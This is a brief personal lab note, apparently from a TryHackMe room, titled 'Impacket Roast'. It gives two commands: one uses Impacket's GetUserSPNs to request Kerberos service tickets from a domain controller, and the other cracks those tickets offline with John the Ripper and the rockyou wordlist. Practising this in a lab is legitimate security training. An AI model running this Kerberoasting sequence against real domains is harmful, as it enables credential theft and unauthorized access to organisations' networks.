Impacket Roast
```bash
impacket-GetUserSPNs -request corp.local/dark -dc-ip 10.10.148.101 -outputfile /home/sstephens/Documents/tryhackme/corp/corproast.txt


john /home/sstephens/Documents/tryhackme/corp/corproast.txt --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt
```